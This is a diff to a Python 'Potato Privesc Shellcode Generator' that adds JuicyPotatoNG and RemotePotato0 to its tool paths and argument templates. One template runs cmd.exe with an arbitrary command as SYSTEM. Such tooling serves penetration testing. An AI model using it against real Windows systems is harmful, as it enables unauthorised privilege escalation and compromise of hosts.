@@ -51,6 +51,18 @@ POTATO_PATHS = {
         "/opt/resources/windows/SweetPotato.exe",
         "{script_dir}/SweetPotato.exe",
     ],
+    "JuicyPotatoNG": [
+        "{script_dir}/tools/potatoes/JuicyPotatoNG.exe",
+        "/opt/killshot/tools/potatoes/JuicyPotatoNG.exe",
+        "/opt/my-resources/tools/potatoes/JuicyPotatoNG.exe",
+        "{script_dir}/JuicyPotatoNG.exe",
+    ],
+    "RemotePotato0": [
+        "{script_dir}/tools/potatoes/RemotePotato0.exe",
+        "/opt/killshot/tools/potatoes/RemotePotato0.exe",
+        "/opt/my-resources/tools/potatoes/RemotePotato0.exe",
+        "{script_dir}/RemotePotato0.exe",
+    ],
 }
 
 # Default args for each potato
@@ -60,6 +72,8 @@ POTATO_ARGS = {
     "BadPotato": "{cmd}",
     "EfsPotato": "{cmd}",
     "SweetPotato": "-a \"{cmd}\"",
+    "JuicyPotatoNG": '-t * -p "cmd.exe" -a "/c {cmd}"',
+    "RemotePotato0": '-m {cmd}',  # RemotePotato0 mode: spray/negotiate/etc
 }
 
 
@@ -157,7 +171,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Potato Privesc Shellcode Generator')
     parser.add_argument('-p', '--potato', required=True,
                         choices=list(POTATO_PATHS.keys()),
-                        help='Potato exploit to use (GodPotato, PrintSpoofer, BadPotato, EfsPotato, SweetPotato)')
+                        help='Potato exploit to use (GodPotato, PrintSpoofer, BadPotato, EfsPotato, SweetPotato, JuicyPotatoNG, RemotePotato0)')
     parser.add_argument('-c', '--cmd', required=True,
                         help='Command to execute as SYSTEM')
     parser.add_argument('-o', '--output', required=True,
